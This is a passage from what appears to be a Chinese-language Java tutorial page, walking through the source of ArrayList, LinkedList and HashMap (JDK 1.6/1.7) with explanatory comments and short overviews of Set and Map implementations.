class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">      rangeCheck(index);<span class="comment">//检验index是否合法</span></span><br><span class="line"></span><br><span class="line">      modCount++;<span class="comment">//修改次数加1</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">//取出[index]位置的元素，[index]位置的元素就是要被删除的元素，用于最后返回被删除的元素</span></span><br><span class="line">      E oldValue = elementData(index);</span><br><span class="line">      </span><br><span class="line"><span class="comment">//需要移动的元素个数</span></span><br><span class="line">      <span class="keyword">int</span> numMoved = size - index - <span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//如果需要移动元素，就用System.arraycopy移动元素</span></span><br><span class="line">      <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">          System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                           numMoved);</span><br><span class="line">      <span class="comment">//将elementData[size-1]位置置空，让GC回收空间，元素个数减少</span></span><br><span class="line">      elementData[--size] = <span class="keyword">null</span>; <span class="comment">// clear to let GC do its work</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> oldValue;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">    rangeCheck(index);<span class="comment">//检验index是否合法</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//取出[index]位置的元素，[index]位置的元素就是要被替换的元素，用于最后返回被替换的元素</span></span><br><span class="line">    E oldValue = elementData(index);</span><br><span class="line">    <span class="comment">//用element替换[index]位置的元素</span></span><br><span class="line">    elementData[index] = element;</span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    rangeCheck(index);<span class="comment">//检验index是否合法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> elementData(index);<span class="comment">//返回[index]位置的元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//分为o是否为空两种情况</span></span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//从前往后找</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            <span class="keyword">if</span> (elementData[i]==<span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            <span class="keyword">if</span> (o.equals(elementData[i]))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lastIndexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">     <span class="comment">//分为o是否为空两种情况</span></span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//从后往前找</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = size-<span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            <span class="keyword">if</span> (elementData[i]==<span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = size-<span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            <span class="keyword">if</span> (o.equals(elementData[i]))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="（3）LinkedList源码分析"><a href="#（3）LinkedList源码分析" class="headerlink" title="（3）LinkedList源码分析"></a>（3）LinkedList源码分析</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">Node&lt;E&gt; first;<span class="comment">//记录第一个结点的位置</span></span><br><span class="line">Node&lt;E&gt; last;<span class="comment">//记录最后一个结点的位置</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">        E item;<span class="comment">//元素数据</span></span><br><span class="line">        Node&lt;E&gt; next;<span class="comment">//下一个结点</span></span><br><span class="line">        Node&lt;E&gt; prev;<span class="comment">//前一个结点</span></span><br><span class="line"></span><br><span class="line">        Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123;</span><br><span class="line">            <span class="keyword">this</span>.item = element;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">            <span class="keyword">this</span>.prev = prev;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    linkLast(e);<span class="comment">//默认把新元素链接到链表尾部</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">linkLast</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; l = last;<span class="comment">//用l 记录原来的最后一个结点</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建新结点</span></span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> Node&lt;&gt;(l, e, <span class="keyword">null</span>);</span><br><span class="line">    <span class="comment">//现在的新结点是最后一个结点了</span></span><br><span class="line">    last = newNode;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//如果l==null，说明原来的链表是空的</span></span><br><span class="line">    <span class="keyword">if</span> (l == <span class="keyword">null</span>)</span><br><span class="line">        <span class="comment">//那么新结点同时也是第一个结点</span></span><br><span class="line">        first = newNode;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">//否则把新结点链接到原来的最后一个结点的next中</span></span><br><span class="line">        l.next = newNode;</span><br><span class="line">    <span class="comment">//元素个数增加</span></span><br><span class="line">    size++;</span><br><span class="line">    <span class="comment">//修改次数增加</span></span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">      <span class="comment">//分o是否为空两种情况</span></span><br><span class="line">      <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="comment">//找到o对应的结点x</span></span><br><span class="line">          <span class="keyword">for</span> (Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next) &#123;</span><br><span class="line">              <span class="keyword">if</span> (x.item == <span class="keyword">null</span>) &#123;</span><br><span class="line">                  unlink(x);<span class="comment">//删除x结点</span></span><br><span class="line">                  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">//找到o对应的结点x</span></span><br><span class="line">          <span class="keyword">for</span> (Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next) &#123;</span><br><span class="line">              <span class="keyword">if</span> (o.equals(x.item)) &#123;</span><br><span class="line">                  unlink(x);<span class="comment">//删除x结点</span></span><br><span class="line">                  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">E <span class="title">unlink</span><span class="params">(Node&lt;E&gt; x)</span> </span>&#123;<span class="comment">//x是要被删除的结点</span></span><br><span class="line">      <span class="comment">// assert x != null;</span></span><br><span class="line">      <span class="keyword">final</span> E element = x.item;<span class="comment">//被删除结点的数据</span></span><br><span class="line">      <span class="keyword">final</span> Node&lt;E&gt; next = x.next;<span class="comment">//被删除结点的下一个结点</span></span><br><span class="line">      <span class="keyword">final</span> Node&lt;E&gt; prev = x.prev;<span class="comment">//被删除结点的上一个结点</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//如果被删除结点的前面没有结点，说明被删除结点是第一个结点</span></span><br><span class="line">      <span class="keyword">if</span> (prev == <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="comment">//那么被删除结点的下一个结点变为第一个结点</span></span><br><span class="line">          first = next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;<span class="comment">//被删除结点不是第一个结点</span></span><br><span class="line">          <span class="comment">//被删除结点的上一个结点的next指向被删除结点的下一个结点</span></span><br><span class="line">          prev.next = next;</span><br><span class="line">          <span class="comment">//断开被删除结点与上一个结点的链接</span></span><br><span class="line">          x.prev = <span class="keyword">null</span>;<span class="comment">//使得GC回收</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//如果被删除结点的后面没有结点，说明被删除结点是最后一个结点</span></span><br><span class="line">      <span class="keyword">if</span> (next == <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="comment">//那么被删除结点的上一个结点变为最后一个结点</span></span><br><span class="line">          last = prev;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;<span class="comment">//被删除结点不是最后一个结点</span></span><br><span class="line">          <span class="comment">//被删除结点的下一个结点的prev执行被删除结点的上一个结点</span></span><br><span class="line">          next.prev = prev;</span><br><span class="line">          <span class="comment">//断开被删除结点与下一个结点的连接</span></span><br><span class="line">          x.next = <span class="keyword">null</span>;<span class="comment">//使得GC回收</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//把被删除结点的数据也置空，使得GC回收</span></span><br><span class="line">      x.item = <span class="keyword">null</span>;</span><br><span class="line">      <span class="comment">//元素个数减少</span></span><br><span class="line">      size--;</span><br><span class="line">      <span class="comment">//修改次数增加</span></span><br><span class="line">      modCount++;</span><br><span class="line">      <span class="comment">//返回被删除结点的数据</span></span><br><span class="line">      <span class="keyword">return</span> element;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="12-5-Set"><a href="#12-5-Set" class="headerlink" title="12.5 Set"></a>12.5 Set</h2><h3 id="12-5-1-Set概述"><a href="#12-5-1-Set概述" class="headerlink" title="12.5.1 Set概述"></a>12.5.1 Set概述</h3><p>Set系列的集合：不可重复的</p><p>Set系列的集合，有有序的也有无序的。HashSet无序的，TreeSet按照元素的大小顺序遍历，LinkedHashSet按照元素的添加顺序遍历。</p><h3 id="12-5-2-实现类的特点"><a href="#12-5-2-实现类的特点" class="headerlink" title="12.5.2 实现类的特点"></a>12.5.2 实现类的特点</h3><p>（1）HashSet：</p><p>​    底层是HashMap实现。添加到HashSet的元素是作为HashMap的key，value是一个Object类型的常量对象PRESENT。</p><p>​    依赖于元素的hashCode()和equals()保证元素的不可重复，存储位置和hashCode()值有关，根据hashCode()来算出它在底层table数组中的[index]</p><p>（2）TreeSet</p><p>​    底层是TreeMap实现。添加到TreeSet的元素是作为TreeMap的key，value是一个Object类型的常量对象PRESENT。</p><p>​    依赖于元素的大小，要么是java.lang.Comparable接口compareTo(Object obj)，要么是java.util.Comparator接口的compare(Object o1, Object o2)来比较元素的大小。认为大小相等的两个元素就是重复元素。</p><p>（3）LinkedHashSet</p><p>​    底层是LinkedHashMap。添加到LinkedHashSet的元素是作为LinkedHashMap的key，value是一个Object类型的常量对象PRESENT。</p><p>​    LinkedHashSet是HashSet的子类，比父类多维护了元素的添加顺序。</p><p>​    当且仅当，你既想要元素不可重复，又要保证元素的添加顺序时，再使用它。</p><p>​    </p><h2 id="12-6-Map"><a href="#12-6-Map" class="headerlink" title="12.6 Map"></a>12.6 Map</h2><h3 id="12-6-1-Map概述"><a href="#12-6-1-Map概述" class="headerlink" title="12.6.1 Map概述"></a>12.6.1 Map概述</h3><p>用来存储键值对，映射关系的集合。所有的Map的key都不能重复。</p><p>键值对、映射关系的类型：Entry类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Entry接口是Map接口的内部接口。所有的Map的键值对的类型都实现了这个接口。</span><br><span class="line">HashMap中的映射关系，是有一个内部类来实现Entry的接口，JDK1.7是一个叫做Entry的内部类实现Entry接口。</span><br><span class="line">JDK1.8是一个叫做Node的内部类实现Entry接口。</span><br><span class="line">TreeMap中的映射关系，是有一个内部类Entry来实现Entry的接口</span><br></pre></td></tr></table></figure><h3 id="12-6-2-API"><a href="#12-6-2-API" class="headerlink" title="12.6.2 API"></a>12.6.2 API</h3><p>（1）put(Object key, Object value)：添加一对映射关系</p><p>（2）putAll(Map m)：添加多对映射关系</p><p>（3）clear()：清空map</p><p>（4）remove(Object key)：根据key删除一对</p><p>（5）int size()：获取有效元素的对数</p><p>（6）containsKey(Object key)：是否包含某个key</p><p>（7）containsValue(Object value)：是否包含某个value</p><p>（8）Object  get(Object key)：根据key获取value</p><p>（9）遍历相关的几个方法</p><p>Collection  values()：获取所有的value进行遍历</p><p>Set keySet()：获取所有key进行遍历</p><p>Set entrySet()：获取所有映射关系进行遍历</p><h3 id="12-6-3-Map的实现类们的区别"><a href="#12-6-3-Map的实现类们的区别" class="headerlink" title="12.6.3 Map的实现类们的区别"></a>12.6.3 Map的实现类们的区别</h3><p>（1）HashMap：</p><p>​    依据key的hashCode()和equals()来保证key是否重复。</p><p>​    key如果重复，新的value会替换旧的value。</p><p>​    hashCode()决定了映射关系在table数组中的存储的位置，index = hash(key.hashCode()) &amp; table.length-1 </p><p>​    HashMap的底层实现：JDK1.7是数组+链表；JDK1.8是数组+链表/红黑树</p><p>（2）TreeMap</p><p>​    依据key的大小来保证key是否重复。key如果重复，新的value会替换旧的value。</p><p>​    key的大小依赖于，java.lang.Comparable或java.util.Comparator。</p><p>（3）LinkedHashMap</p><p>​    依据key的hashCode()和equals()来保证key是否重复。key如果重复，新的value会替换旧的value。</p><p>​    LinkedHashMap是HashMap的子类，比HashMap多了添加顺序</p><h3 id="12-6-4-HashMap源码分析"><a href="#12-6-4-HashMap源码分析" class="headerlink" title="12.6.4 HashMap源码分析"></a>12.6.4 HashMap源码分析</h3><h4 id="JDK1-6源码："><a href="#JDK1-6源码：" class="headerlink" title="JDK1.6源码："></a>JDK1.6源码：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//this.loadFactor加载因子，影响扩容的频率</span></span><br><span class="line">    <span class="comment">//DEFAULT_LOAD_FACTOR：默认加载因子0.75</span></span><br><span class="line">    <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR;</span><br><span class="line">    <span class="comment">//threshold阈值 = 容量 * 加载因子</span></span><br><span class="line">    <span class="comment">//threshold阈值，当size达到threhold时，考虑扩容</span></span><br><span class="line">    <span class="comment">//扩容需要两个条件同时满足：（1）size &gt;= threhold （2）table[index]！=null，即新映射关系要存入的位置非空</span></span><br><span class="line">    threshold = (<span class="keyword">int</span>)(DEFAULT_INITIAL_CAPACITY * DEFAULT_LOAD_FACTOR);</span><br><span class="line">    <span class="comment">//table是数组，</span></span><br><span class="line">    <span class="comment">//DEFAULT_INITIAL_CAPACITY：默认是16</span></span><br><span class="line">    table = <span class="keyword">new</span> Entry[DEFAULT_INITIAL_CAPACITY];</span><br><span class="line">    init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="JDK1-7源码："><a href="#JDK1-7源码：" class="headerlink" title="JDK1.7源码："></a>JDK1.7源码：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//DEFAULT_INITIAL_CAPACITY：默认初始容量16</span></span><br><span class="line">  <span class="comment">//DEFAULT_LOAD_FACTOR：默认加载因子0.75</span></span><br><span class="line">      <span class="keyword">this</span>(DEFAULT_INITIAL_CAPACITY, DEFAULT_LOAD_FACTOR);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor)</span> </span>&#123;</span><br><span class="line">      <span class="comment">//校验initialCapacity合法性</span></span><br><span class="line">      <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal initial capacity: "</span> +</span><br><span class="line">      <span class="comment">//校验initialCapacity合法性                                       initialCapacity);</span></span><br><span class="line">      <span class="keyword">if</span> (initialCapacity &gt; MAXIMUM_CAPACITY)</span><br><span class="line">          initialCapacity = MAXIMUM_CAPACITY;</span><br><span class="line">      <span class="comment">//校验loadFactor合法性</span></span><br><span class="line">      <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line"><span class="comment">//加载因子，初始化为0.75</span></span><br><span class="line">      <span class="keyword">this</span>.loadFactor = loadFactor;</span><br><span class="line">      <span class="comment">// threshold 初始为初始容量                                  </span></span><br><span class="line">      threshold = initialCapacity;</span><br><span class="line">      init();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//如果table数组是空的，那么先创建数组</span></span><br><span class="line">        <span class="keyword">if</span> (table == EMPTY_TABLE) &#123;</span><br><span class="line">            <span class="comment">//threshold一开始是初始容量的值</span></span><br><span class="line">            inflateTable(threshold);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果key是null，单独处理</span></span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//对key的hashCode进行干扰，算出一个hash值</span></span><br><span class="line">        <span class="keyword">int</span> hash = hash(key);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//计算新的映射关系应该存到table[i]位置，</span></span><br><span class="line">        <span class="comment">//i = hash &amp; table.length-1，可以保证i在[0,table.length-1]范围内</span></span><br><span class="line">        <span class="keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//检查table[i]下面有没有key与我新的映射关系的key重复，如果重复替换value</span></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">            Object k;</span><br><span class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">                V oldValue = e.value;</span><br><span class="line">                e.value = value;</span><br><span class="line">                e.recordAccess(<span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="comment">//添加新的映射关系</span></span><br><span class="line">        addEntry(hash, key, value, i);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inflateTable</span><span class="params">(<span class="keyword">int</span> toSize)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Find a power of 2 &gt;= toSize</span></span><br><span class="line">        <span class="keyword">int</span> capacity = roundUpToPowerOf2(toSize);<span class="comment">//容量是等于toSize值的最接近的2的n次方</span></span><br><span class="line"><span class="comment">//计算阈值 = 容量 * 加载因子</span></span><br><span class="line">        threshold = (<span class="keyword">int</span>) Math.min(capacity * loadFactor, MAXIMUM_CAPACITY + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//创建Entry[]数组，长度为capacity</span></span><br><span class="line">        table = <span class="keyword">new</span> Entry[capacity];</span><br><span class="line">        initHashSeedAsNeeded(capacity);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果key是null，直接存入[0]的位置</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> V <span class="title">putForNullKey</span><span class="params">(V value)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//判断是否有重复的key，如果有重复的，就替换value</span></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[<span class="number">0</span>]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e.key == <span class="keyword">null</span>) &#123;</span><br><span class="line">                V oldValue = e.value;</span><br><span class="line">                e.value = value;</span><br><span class="line">                e.recordAccess(<span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="comment">//把新的映射关系存入[0]的位置，而且key的hash值用0表示</span></span><br><span class="line">        addEntry(<span class="number">0</span>, <span class="keyword">null</span>, value, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addEntry</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">int</span> bucketIndex)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//判断是否需要库容</span></span><br><span class="line">        <span class="comment">//扩容：（1）size达到阈值（2）table[i]正好非空</span></span><br><span class="line">        <span class="keyword">if</span> ((size &gt;= threshold) &amp;&amp; (<span class="keyword">null</span> != table[bucketIndex])) &#123;</span><br><span class="line">            <span class="comment">//table扩容为原来的2倍，并且扩容后，会重新调整所有映射关系的存储位置</span></span><br><span class="line">            resize(<span class="number">2</span> * table.length);</span><br><span class="line">            <span class="comment">//新的映射关系的hash和index也会重新计算</span></span><br><span class="line">            hash = (<span class="keyword">null</span> != key) ? hash(key) : <span class="number">0</span>;</span><br><span class="line">            bucketIndex = indexFor(hash, table.length);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//存入table中</span></span><br><span class="line">        createEntry(hash, key, value, 